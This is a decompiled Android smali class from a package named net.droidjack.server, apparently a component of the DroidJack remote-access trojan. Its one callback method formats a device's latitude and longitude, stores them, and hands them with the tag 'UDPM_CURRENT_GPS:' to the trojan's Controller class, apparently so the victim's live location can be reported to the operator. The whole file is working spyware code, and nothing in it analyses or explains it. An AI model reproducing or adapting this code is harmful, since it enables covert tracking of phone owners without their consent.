.class Lnet/droidjack/server/bb;
.super Ljava/lang/Object;

# interfaces
.implements Lnet/droidjack/server/bl;


# instance fields
.field final synthetic a:Lnet/droidjack/server/ba;


# direct methods
.method constructor <init>(Lnet/droidjack/server/ba;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/bb;->a:Lnet/droidjack/server/ba;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Lnet/droidjack/server/bk;)V
    .locals 4

    new-instance v0, Ljava/lang/StringBuilder;

    iget v1, p1, Lnet/droidjack/server/bk;->b:F

    invoke-static {v1}, Ljava/lang/String;->valueOf(F)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, ","

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget v1, p1, Lnet/droidjack/server/bk;->a:F

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iget v1, p1, Lnet/droidjack/server/bk;->b:F

    float-to-double v2, v1

    invoke-static {v2, v3}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v1

    invoke-static {v1}, Lnet/droidjack/server/GPSLocation;->a(Ljava/lang/Double;)V

    iget v1, p1, Lnet/droidjack/server/bk;->a:F

    float-to-double v2, v1

    invoke-static {v2, v3}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v1

    invoke-static {v1}, Lnet/droidjack/server/GPSLocation;->b(Ljava/lang/Double;)V

    const-string v1, "UDPM_CURRENT_GPS:"

    invoke-static {v1, v0}, Lnet/droidjack/server/Controller;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method
